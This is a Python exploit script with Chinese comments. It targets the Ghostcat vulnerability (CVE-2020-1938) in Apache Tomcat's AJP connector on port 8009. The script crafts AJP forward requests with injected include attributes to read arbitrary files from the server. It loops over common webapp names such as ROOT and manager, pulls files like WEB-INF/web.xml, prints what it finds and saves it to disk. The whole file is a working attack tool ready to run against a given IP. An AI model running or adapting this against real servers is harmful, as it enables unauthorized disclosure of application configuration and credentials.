#!/usr/bin/env python3
"""
Ghostcat CVE-2020-1938 批量探测脚本
自动尝试多个 webapp 名称和路径
"""

import socket
import struct
import sys

AJP_MAGIC = b"\x12\x34"

class GhostcatScanner:
    def __init__(self, host, port=8009):
        self.host = host
        self.port = port
        
    def build_forward_request(self, method, uri, attributes=None):
        """构建 Forward Request"""
        methods = {"GET": 2, "POST": 4}
        method_code = methods.get(method.upper(), 2)
        
        protocol = b"HTTP/1.1"
        req_uri = uri.encode() if isinstance(uri, str) else uri
        remote_addr = b"127.0.0.1"
        remote_host = b"localhost"
        server_name = self.host.encode()
        server_port = 80
        is_ssl = 0
        
        data = struct.pack("B", method_code)
        data += struct.pack(">H", len(protocol)) + protocol
        data += struct.pack(">H", len(req_uri)) + req_uri
        data += struct.pack(">H", len(remote_addr)) + remote_addr
        data += struct.pack(">H", len(remote_host)) + remote_host
        data += struct.pack(">H", len(server_name)) + server_name
        data += struct.pack(">H", server_port)
        data += struct.pack("B", is_ssl)
        data += struct.pack(">H", 0)  # 0 headers
        
        # 添加属性
        if attributes:
            for attr_code, attr_value in attributes:
                data += struct.pack("B", attr_code)
                if attr_value is not None:
                    val_bytes = attr_value.encode() if isinstance(attr_value, str) else attr_value
                    data += struct.pack(">H", len(val_bytes)) + val_bytes
        
        data += b"\xff"  # 结束
        return data
    
    def send_and_receive(self, packet):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((self.host, self.port))
            length = len(packet)
            full_packet = AJP_MAGIC + struct.pack(">H", length) + packet + b"\x00"
            sock.send(full_packet)
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"\x05" in chunk:  # END_RESPONSE
                        break
                except socket.timeout:
                    break
            return response
        finally:
            sock.close()
    
    def try_webapp(self, webapp, file_path):
        """尝试读取指定 webapp 的文件"""
        uri = f"/{webapp}/test" if webapp else "/test"
        
        attributes = [
            (0x0A, uri),  # javax.servlet.include.request_uri
            (0x0E, file_path),  # javax.servlet.include.path_info
        ]
        
        packet = self.build_forward_request("GET", uri, attributes)
        response = self.send_and_receive(packet)
        
        return self.parse_body(response)
    
    def parse_body(self, response):
        """从 AJP 响应中提取 HTTP body"""
        if not response:
            return None
        
        # 查找 SEND_BODY_CHUNK (0x03)
        pos = 0
        while pos < len(response) - 5:
            # 检查是否是 AJP 包开头
            if response[pos:pos+2] == AJP_MAGIC:
                if pos + 4 >= len(response):
                    break
                    
                length = struct.unpack(">H", response[pos+2:pos+4])[0]
                if pos + 4 >= len(response):
                    break
                    
                packet_type = response[pos+4]
                
                if packet_type == 0x03:  # SEND_BODY_CHUNK
                    if pos + 7 <= len(response):
                        chunk_len = struct.unpack(">H", response[pos+5:pos+7])[0]
                        body = response[pos+7:pos+7+chunk_len]
                        return body.decode('utf-8', errors='ignore')
                
                # 移动到下一个包
                pos += 4 + length + 1
            else:
                pos += 1
        
        # 如果没找到 chunk，尝试直接解码
        try:
            return response.decode('utf-8', errors='ignore')
        except:
            return str(response)
    
    def scan_webapps(self):
        """扫描常见 webapp 名称"""
        webapps = [
            "",           # 空
            " ",          # 空格
            "ROOT",       # 根应用
            "manager",    # 管理后台
            "host-manager",
            "docs",
            "examples",
            "sample",
            "webapps",
            "jsp-examples",
            "servlets-examples",
        ]
        
        test_files = [
            "index.jsp",
            "WEB-INF/web.xml",
            "META-INF/MANIFEST.MF",
            "index.html",
        ]
        
        print(f"[*] 开始扫描 {self.host}:{self.port}")
        print("=" * 60)
        
        for webapp in webapps:
            print(f"\n[*] 尝试 webapp: '{webapp}'")
            
            for file_path in test_files:
                result = self.try_webapp(webapp, file_path)
                
                if result and "Internal Server Error" not in result and "Error" not in result and len(result) > 10:
                    print(f"[+] 成功! webapp='{webapp}', file='{file_path}'")
                    print(f"[+] 内容长度: {len(result)}")
                    print("-" * 40)
                    print(result[:500])  # 打印前500字符
                    print("-" * 40)
                    
                    # 保存成功结果
                    with open(f"ghostcat_{webapp}_{file_path.replace('/', '_')}.txt", "w", encoding="utf-8") as f:
                        f.write(result)
                    return webapp, file_path
        
        print("\n[-] 未找到可访问的 webapp，尝试暴力猜测...")
        return None, None

def main():
    if len(sys.argv) < 2:
        print(f"用法: python {sys.argv[0]} <目标IP> [端口]")
        print(f"示例: python {sys.argv[0]} 192.168.11.72 8009")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8009
    
    scanner = GhostcatScanner(host, port)
    scanner.scan_webapps()

if __name__ == "__main__":
    main()